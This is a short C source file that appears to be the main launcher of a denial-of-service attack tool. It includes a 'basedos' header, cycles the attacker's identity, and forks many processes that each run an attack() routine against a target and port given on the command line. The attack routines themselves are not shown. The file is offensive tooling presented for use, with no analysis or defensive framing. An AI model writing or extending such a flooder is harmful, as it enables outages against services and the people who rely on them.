#include "libz/basedos.h"
#include "libz/common.h"

#include <stdio.h>


int main(int argc, char **argv) {
	int x;
	if(argc !=3)
		cycle_identity();
	for(x=0; x != THREADS; x++) {
		if(fork())
			attack(argv[1], argv[2], x);
		usleep(250000);
	}
	getc(stdin);
	return 0;
}